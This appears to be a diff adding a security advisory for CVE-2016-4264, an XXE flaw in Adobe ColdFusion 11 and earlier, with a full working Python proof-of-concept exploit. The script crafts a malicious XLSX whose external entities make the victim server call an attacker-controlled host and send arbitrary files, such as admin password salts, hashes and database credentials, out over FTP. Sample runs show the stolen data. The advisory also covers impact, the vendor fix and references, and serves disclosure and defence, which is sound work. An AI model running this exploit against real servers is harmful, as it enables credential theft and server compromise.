@@ -1,0 +1,572 @@
+'''
+=============================================
+- Discovered by: Dawid Golunski
+- http://legalhackers.com
+- dawid (at) legalhackers.com
+
+- CVE-2016-4264
+- APSB16-30
+- Release date: 31.08.2016
+- Severity: Critical
+=============================================
+
+
+I. VULNERABILITY
+-------------------------
+
+Adobe ColdFusion <= 11   XML External Entity (XXE) Injection
+
+
+II. BACKGROUND
+-------------------------
+
+"Adobe ColdFusion 11 Enterprise Edition offers a single platform to
+rapidly build and deploy scalable, high-performing web and mobile
+applications. Leverage unique capabilities to develop, test, and debug
+mobile applications end to end. Generate high-quality PDF files and
+manipulate them easily."
+
+http://www.adobe.com/products/coldfusion-family.html
+
+ColdFusion is widely deployed. A google search for a ColdFusion index file 
+(index.cfm) exposes over 30 million websites of various sectors that make use 
+of ColdFusion platform in a visible way:
+https://www.google.com/?q=inurl:%2Findex.cfm
+including various government websites:
+https://www.google.com/search?q=inurl:index.cfm+site:gov
+
+
+III. INTRODUCTION
+-------------------------
+
+An independent research revealed that Adobe ColdFusion in versions 11 and below
+is vulnerable to XXE Injection when processing untrusted office documents.
+
+Depending on web application's functionality and the attacker's ability to 
+supply a malicious document to be processed by a vulnerable ColdFusion 
+application, this vulnerability may potentially be exploited by both 
+low-privileged and unauthenticated remote attackers.
+
+This vulnerability can allow various attacks including:
+
+- reading arbitrary files (stored on the server and within the network shares)
+- listing web/system directories
+- SSRF attacks / unauthorized access to restricted services running on the localhost
+  as well as within the victim's server network
+- SMB relay attacks
+- temporary file uploads which may be used by attackers in combination with LFI 
+  vulnerabilities to supply malicious code
+
+This advisory provides a PoC exploit that demonstrates how a remote attacker 
+could read arbitrary files from the target server, as well as list directories. 
+
+Ability to read arbitrary files could for example let attackers extract sensitive
+information such as ColdFusion password hashes of the management console or stored 
+database credentials. 
+This could allow unauthorized access to weakly protected ColdFusion management 
+interfaces and let attackers upload malicious code which could be used to fully 
+compromise the server.
+
+
+IV. DESCRIPTION
+-------------------------
+
+The XXE vulnerability was found in the Office Open XML (OOXML) processing 
+functions which are utilised when opening documents that use XML structure.  
+Documents that are commonly stored in this format include:
+
+- DOCX (Word documents) 
+- XLSX (Excel spreadsheets)  
+- PPTX (PowerPoint presentations)
+
+More information about the format can be found in:
+https://en.wikipedia.org/wiki/Office_Open_XML
+
+The vulnerability is caused by an unrestricted XML parser which allows 
+for external XML entities processing when parsing such document. 
+
+Many web applications often accept OOXML documents from their users to process 
+documents of various purposes, for example:
+
+- invoices
+- bank statements
+- bills
+- tax forms
+- inventory
+- CVs / cover letters
+- application forms
+
+etc.
+
+Such upload functionality is often exposed to low-privileged or even 
+unauthenticated remote users.
+
+If an attacker is able to upload a specially crafted OOXML document
+which is later processed by an application written in Adobe ColdFusion,
+they may be able to perform various malicious actions including
+arbitrary file reading and directory listing as mentioned in the
+introduction.
+
+This could for example be used by malicious users to read sensitive
+ColdFusion config files such as:
+
+- neo-security.xml , which stores ColdFusion admin's password hash salt
+- password.properties , which stores admin's password hash
+- neo-datasource.xml , which stores database credentials
+
+that are stored in c:\ColdFusion11\cfusion\lib\ directory by default on Windows
+installations.
+
+Attackers might also access the application sourcecodes within the documentroot:
+
+c:\ColdFusion11\cfusion\wwwroot
+
+or access other sensitive system files available within the system.
+
+As the vulnerability also allows browsing the filesystem and its directories, 
+attackers may easily find interesting files and ColdFusion config/webroot 
+directories even if the paths differ from the default ones.
+
+Attackers who have gained access to password hashes could then proceed
+to cracking them in order to gain unauthorised access to the databases and 
+ColdFusion administrator panels to fully compromise the target.
+
+More information on hashes used by ColdFusion 11 can be found in the references
+below.
+
+The next section presents a PoC exploit that can be used for file/directory 
+retrieval.
+The exploit will work even if the target ColdFusion application does not return
+any data back to the attacker upon processing a malicious document file.
+The extracted data will be sent over the network back to the attacker as soon 
+as the document file is processed.
+
+
+V. PROOF OF CONCEPT EXPLOIT
+-------------------------
+
+An example vulnerable ColdFusion application written in CFML language
+which loads a spreadsheet document could look as follows:
+
+
+---[ vulnerable.cfm ]---
+
+<cfspreadsheet format="csv" action="read" src="#expandPath( 'cf_poc_exploit.xlsx' )#" name="xlsdoc" rows="1-4" />
+
+<cfoutput>#xlsdoc#</cfoutput>  
+
+------------------------
+
+
+For simplicity, this ColdFusion application will load cf_poc_exploit.xlsx 
+document from the current directory. 
+In a real-world situation the application would allow a user to upload a 
+document from their disk or alternatively fetch it from a URL.  
+
+Attacker could use the exploit below to prepare a malicious document and 
+supply it to a vulnerable ColdFusion application.
+
+
+---[ ./cf_xxe_exploit.py ]---
+'''
+
+#!/usr/bin/python  
+
+intro = """
+(CVE-2016-4264) ColdFusion <= 11   XXE / Arbitrary File Read PoC exploit
+
+This exploit produces a PoC OOXML spreadsheet document with XXE payload that can be 
+uploaded to a vulnerable ColdFusion application. 
+It starts up an ftp/data receiver (port 9090) as well as a web server (port 8080) 
+in order to retrieve an arbitrary file from the victim (upon processing the PoC spreadsheet).
+
+Discovered/Coded by:
+
+ Dawid Golunski
+ http://legalhackers.com
+"""
+usage = """
+Usage:
+The exploit requires that you have an external IP and can start web/http listeners on ports 
+8080/9090 on the attacking machine.
+
+./cf_xxe_exploit.py external_IP 'path_to_fetch'
+
+The example below starts an ftp listener on 192.168.1.40 (port 9090) and web server on 8080 
+and fetches c:\windows\win.ini file from the target.
+
+./cf_xxe_exploit.py 192.168.1.40 c:/windows/win.ini
+
+The path can also be a directory to retrieve a directory listing e.g:
+
+./cf_xxe_exploit.py 192.168.1.40 c:/
+
+will list the contents of drive C: on Windows
+
+Disclaimer:
+For testing purposes only. Do no harm.
+
+Full advisory URL:
+http://legalhackers.com/advisories/Adobe-ColdFusion-11-XXE-Exploit-CVE-2016-4264.txt
+"""
+
+import socket     
+import subprocess
+import sys
+import web # http://webpy.org/installation
+import threading
+import time
+
+# What file to retrieve from the victim server
+target_file = "c:/ColdFusion11/cfusion/lib/pass"
+# Web server (to serve XML)
+external_ip = '192.168.57.10'
+web_port = 8080
+# File receiver 
+ftp_port = 9090 
+timeout=5    
+
+# HTTP listener that will return intermediate XML (passdata.xml) in order to establish an ftp connection
+class webserver(threading.Thread):
+    def run (self):
+        urls = ('/passdata.xml', 'pass_xml')
+        app = web.application(urls, globals())
+        #app.run()
+	return web.httpserver.runsimple( app.wsgifunc(), ('0.0.0.0', web_port))
+
+# Pass data to ftp server using passdata.xml
+class pass_xml:
+    def GET(self):
+	print xxe_send_payload
+
+# HTTP listener that will return intermediate XML (passdata.xml) in order to establish an ftp connection
+class webserver(threading.Thread):
+    def run (self):
+        urls = ('/passdata.xml', 'pass_xml')
+        app = web.application(urls, globals())
+        #app.run()
+	return web.httpserver.runsimple( app.wsgifunc(), ('0.0.0.0', web_port))
+
+# Return helper xml/xxe payload to forward data
+class pass_xml:
+    def GET(self):
+	print "[+] Received GET /passdata.xml web request from the victim (%s) ! TARGET VULNERABLE to XXE !\n" % (web.ctx['ip'])
+	return xxe_send_payload
+
+def shutdown(code):
+	print "[+] That's it folks :) Shutting down \n"
+	web.httpserver.server.interrupt = KeyboardInterrupt()
+	exit(code)
+
+
+# [ Main Meat ]
+
+print intro
+redirector_started = 0
+
+if len(sys.argv) < 3 :
+   print usage
+   sys.exit(2)
+
+# Overwrite settings with parameters from argv[]
+external_ip = sys.argv[1]
+target_file = sys.argv[2]
+
+print "[+] Setting external IP to '%s' and target path to '%s'\n" % (external_ip, target_file)
+
+# Prepare XXE payloads
+#OOXML XXE stub
+ooxml_xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE Types [
+        <!ENTITY % remote SYSTEM "http://_attackerhost_:_webport_/passdata.xml">
+        %remote; 
+]>
+"""
+ooxml_xxe_payload = ooxml_xxe_payload.replace("_attackerhost_", external_ip)
+ooxml_xxe_payload = ooxml_xxe_payload.replace("_webport_", str(web_port))
+
+# passdata.xml
+xxe_send_payload = """<!ENTITY % file1 SYSTEM "file:///_filepath_">
+<!ENTITY % param1 '<!ENTITY &#37; retrfile1 SYSTEM "ftp://cfhack:PoCexploit@_attackerhost_:_ftpport_/%file1;" >' >
+%param1;
+%retrfile1; """
+xxe_send_payload = xxe_send_payload.replace("_filepath_", target_file)
+xxe_send_payload = xxe_send_payload.replace("_attackerhost_", external_ip)
+xxe_send_payload = xxe_send_payload.replace("_ftpport_", str(ftp_port))
+
+# Create OXML spreadsheet file cf_poc_spreadsheet.xlsx with XXE payload
+f = open("[Content_Types].xml", "w")
+f.write(ooxml_xxe_payload )
+f.close()
+cmd = "zip -r cf_poc_spreadsheet.xlsx '[Content_Types].xml' && rm -f '[Content_Types].xml'"
+process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+(result, error) = process.communicate()
+rc = process.wait() 
+if rc != 0:
+	print "Error: failed to execute command:", cmd
+	print error 
+	shutdown(3)
+
+print "[+] Successfully created PoC spreadsheet with XXE payload in 'cf_poc_spreadsheet.xlsx' file\n" 
+print "[+] Starting our web server to serve XML on %s:%s \n" % (external_ip, web_port)
+webserver().start()
+time.sleep(1)
+
+print '\n[+] Starting FTP/data listener and waiting for connection on %s:%d\n' % (external_ip, ftp_port)
+s = socket.socket()         # Create/bind socket
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((external_ip, ftp_port))  
+
+print "[*] Upload the 'cf_poc_spreadsheet.xlsx' spreadsheet document to the target ColdFusion app now...\n"
+
+s.listen(5)                 # Wait for the victim to connect
+c, addr = s.accept()        # Establish connection with the victim
+print '\n[+] Got a connection from ', addr, " to our FTP/data server. Meaning juicy data is on the way! :)\n"
+c.send("220 Welcome to ColdFusion XXE PoC exploit server\n")
+
+print '[+] Receiving data from the victim...\n'
+
+downloaded = ""
+
+while True:
+   data = ""
+   c.settimeout(timeout)
+   try:
+        data = c.recv(1024)
+   except socket.timeout:
+        print "Timeout ! No more data\n"
+	break
+
+   # extract data
+   if data.startswith("CWD "):
+	   downloaded = downloaded + data[4:]
+   if data.startswith("RETR "):
+	   downloaded = downloaded + data[5:]
+
+   print "Received packet: " + data
+   #sys.stdout.write('.')
+   #sys.stdout.flush()
+
+   if "USER" in data:
+      c.send("331 password needed\n")
+   elif "RETR" in data:
+	c.send("550 No such file or directory.\n")
+	break
+   else:
+      c.send('230 continue\n')
+
+# Results
+print "\n\n[+] Here's the retrieved contents of the target file/directory (%s) : \n\n%s\n" % (target_file, downloaded)
+
+# shutdown
+c.close()                # Close the connection
+s.shutdown(0)
+s.close()
+shutdown(0)
+
+'''
+-------------[eof]-----------
+
+
+You can see the exploit in action in a PoC video at:
+
+http://legalhackers.com/videos/ColdFusion-XXE-PoC-Exploit
+
+There are also two examples below:
+
+
+A) Reading c:/ColdFusion11/cfusion/lib/neo-security.xml file which contains admin hash salt:
+
+
+root@trusty:~/exploit# ./cf_xxe_exploit.py 192.168.57.10 c:/ColdFusion11/cfusion/lib/neo-security.xml
+
+(CVE-2016-4264) ColdFusion <= 11   XXE / Arbitrary File Read PoC exploit
+
+This exploit produces a PoC OOXML spreadsheet document with XXE payload that can be 
+uploaded to a vulnerable ColdFusion application. 
+It starts up an ftp/data receiver (port 9090) as well as a web server (port 8080) 
+in order to retrieve an arbitrary file from the victim (upon processing the PoC spreadsheet).
+
+Discovered/Coded by:
+
+ Dawid Golunski
+ http://legalhackers.com
+
+[+] Setting external IP to '192.168.57.10' and target path to 'c:/ColdFusion11/cfusion/lib/neo-security.xml'
+
+[+] Successfully created PoC spreadsheet with XXE payload in 'cf_poc_spreadsheet.xlsx' file
+
+[+] Starting our web server to serve XML on 192.168.57.10:8080 
+
+http://0.0.0.0:8080/
+
+[+] Starting FTP/data listener and waiting for connection on 192.168.57.10:9090
+
+[*] Upload the 'cf_poc_spreadsheet.xlsx' spreadsheet document to the target ColdFusion app now...
+
+[+] Received GET /passdata.xml web request from the victim (192.168.57.21) ! TARGET VULNERABLE to XXE !
+
+192.168.57.21:57219 - - [31/Aug/2016 20:12:06] "HTTP/1.1 GET /passdata.xml" - 200 OK
+
+[+] Got a connection from  ('192.168.57.21', 57220)  to our FTP/data server. Meaning juicy data is on the way! :)
+
+[+] Receiving data from the victim...
+
+Received packet: USER cfhack
+Received packet: PASS PoCexploit
+Received packet: TYPE I
+Received packet: CWD <wddxPacket version='1.0'><header
+[cut]
+
+[+] Here's the retrieved contents of the target file/directory (c:/ColdFusion11/cfusion/lib/neo-security.xml) : 
+
+<wddxPacket version='1.0'><header
+[cut]
+struct><
+var><var name='admin.userid.root.salt'><string>A54B28011C6AC37F4D65B7D608D40722DAD6CDF25A943C809492637D2CC6265F<
+string><
+var><var name='rds.enabled'><string>false<
+[cut]
+
+
+[+] That's it folks :) Shutting down 
+
+
+~~~~~~~~~~~~
+
+
+B) Listing the contents of the c:/ColdFusion11/ directory: 
+
+
+root@trusty:~/exploit# ./cf_xxe_exploit.py 192.168.57.10 c:/ColdFusion11/
+
+[cut]
+[+] Setting external IP to '192.168.57.10' and target path to 'c:/ColdFusion11/'
+
+[+] Successfully created PoC spreadsheet with XXE payload in 'cf_poc_spreadsheet.xlsx' file
+
+[+] Starting our web server to serve XML on 192.168.57.10:8080 
+
+http://0.0.0.0:8080/
+
+[+] Starting FTP/data listener and waiting for connection on 192.168.57.10:9090
+
+[*] Upload the 'cf_poc_spreadsheet.xlsx' spreadsheet document to the target ColdFusion app now...
+
+[+] Received GET /passdata.xml web request from the victim (192.168.57.21) ! TARGET VULNERABLE to XXE !
+
+192.168.57.21:57245 - - [31/Aug/2016 20:14:06] "HTTP/1.1 GET /passdata.xml" - 200 OK
+
+[+] Got a connection from  ('192.168.57.21', 57246)  to our FTP/data server. Meaning juicy data is on the way! :)
+
+[+] Receiving data from the victim...
+
+Received packet: USER cfhack
+
+Received packet: RETR Adobe_ColdFusion_11_Install_08_30_2016_19_59_04.log
+cf_app.ico
+
+[cut]
+
+[+] Here's the retrieved contents of the target file/directory (c:/ColdFusion11/) : 
+
+Adobe_ColdFusion_11_Install_08_30_2016_19_59_04.log
+cf_app.ico
+cfusion
+config
+jre
+license.html
+Readme.htm
+uninstall
+
+
+[+] That's it folks :) Shutting down 
+
+
+
+VI. BUSINESS IMPACT
+-------------------------
+
+The vulnerability can be abused by low-privileged or unauthenticated remote
+attackers depending on application's functionality and lead to sensitive 
+information disclosure. It can allow attackers to read arbitrary files or 
+expose internal services running on the server and within the local network. 
+
+Attackers could for example read stored password hashes or database credentials 
+which may aid attackers with gaining access to ColdFusion admin interface.
+Extracting application sourcecodes could also be of use to attackers and help
+them to find other vulnerabilities to fully compromise an affected target.
+
+ 
+VII. SYSTEMS AFFECTED
+-------------------------
+
+ColdFusion installations before:
+
+- ColdFusion 11 Update 10
+- ColdFusion 10	Update 21
+
+are affected by this vulnerability.
+
+ 
+VIII. SOLUTION
+-------------------------
+
+Update to ColdFusion 11 Update 10 which include critical hotfixes released by
+the vendor upon initial private disclosure to Adobe. Alternatively users can
+upgrade their installation to ColdFusion 2016 which is not affected. 
+
+The vulnerability fix/advisory has been assigned APSB16-30 id by Adobe.
+
+Links to the critical Adobe hotfix patches can be found in the references below.
+
+
+IX. REFERENCES
+-------------------------
+
+http://legalhackers.com
+http://legalhackers.com/advisories/Adobe-ColdFusion-11-XXE-Exploit-CVE-2016-4264.txt
+http://legalhackers.com/exploits/cf_xxe_exploit_CVE-2016-4264.py
+
+PoC exploit video:
+http://legalhackers.com/videos/ColdFusion-XXE-PoC-Exploit
+
+https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-4264
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4264
+
+Adobe ColdFusion critical hotfix/vuln announcement:
+https://helpx.adobe.com/security/products/coldfusion/apsb16-30.html
+
+Info on ColdFusion configs and used hashes:
+http://www.openwall.com/lists/john-users/2015/06/07/1
+https://helpx.adobe.com/coldfusion/kb/purpose-location-xml-configuration-files.html
+https://blogs.adobe.com/psirt/?p=1395
+
+http://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers
+
+Lockdown guides:
+http://www.adobe.com/content/dam/Adobe/en/products/coldfusion/pdfs/cf11/cf11-lockdown-guide.pdf
+
+
+X. CREDITS
+-------------------------
+
+The vulnerability has been discovered by Dawid Golunski
+
+dawid (at) legalhackers (dot) com
+http://legalhackers.com
+ 
+XI. REVISION HISTORY
+-------------------------
+
+31.08.2016 - advisory released
+01.09.2016 - corrections applied
+07.09.2016 - added PoC video
+ 
+XII. LEGAL NOTICES
+-------------------------
+
+The information contained within this advisory is supplied "as-is" with
+no warranties or guarantees of fitness of use or otherwise. I accept no
+responsibility for any damage caused by the use or misuse of this information.
+'''
